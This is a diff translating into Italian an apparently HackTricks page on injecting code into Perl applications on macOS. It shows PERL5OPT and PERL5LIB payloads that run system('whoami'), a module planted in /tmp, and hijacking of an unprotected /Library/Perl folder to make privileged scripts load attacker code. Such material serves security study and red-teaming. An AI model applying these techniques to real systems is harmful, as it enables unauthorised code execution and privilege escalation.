@@ -1,23 +1,23 @@
-# macOS Perl Applications Injection
+# Iniezione di applicazioni Perl su macOS
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## Attraverso la variabile d'ambiente `PERL5OPT` e `PERL5LIB`
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
+Utilizzando la variabile d'ambiente PERL5OPT è possibile far eseguire a Perl comandi arbitrari.\
+Ad esempio, crea questo script:
 
 {% code title="test.pl" %}
 ```perl
@@ -26,14 +26,12 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Now **export the env variable** and execute the **perl** script:
-
+Ora **esporta la variabile di ambiente** ed esegui lo script **perl**:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
+Un'altra opzione è creare un modulo Perl (ad esempio, `/tmp/pmod.pm`):
 
 {% code title="/tmp/pmod.pm" %}
 ```perl
@@ -44,22 +42,17 @@ system('whoami');
 ```
 {% endcode %}
 
-And then use the env variables:
-
+E quindi utilizzare le variabili di ambiente:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
+## Attraverso le dipendenze
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
+È possibile elencare l'ordine delle cartelle delle dipendenze di Perl in esecuzione:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+Che restituirà qualcosa come:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -71,31 +64,30 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
+Alcune delle cartelle restituite non esistono nemmeno, tuttavia, **`/Library/Perl/5.30`** esiste, non è protetta da SIP ed è posizionata prima delle cartelle protette da SIP. Pertanto, qualcuno potrebbe sfruttare quella cartella per aggiungere dipendenze di script in modo che uno script Perl ad alto privilegio le carichi.
 
 {% hint style="warning" %}
-However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
+Tuttavia, nota che **è necessario essere root per scrivere in quella cartella** e oggi otterrai questa **richiesta TCC**:
 {% endhint %}
 
 <figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>
 
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+Ad esempio, se uno script sta importando **`use File::Basename;`**, sarebbe possibile creare `/Library/Perl/5.30/File/Basename.pm` per eseguire codice arbitrario.
 
-## References
+## Riferimenti
 
 * [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
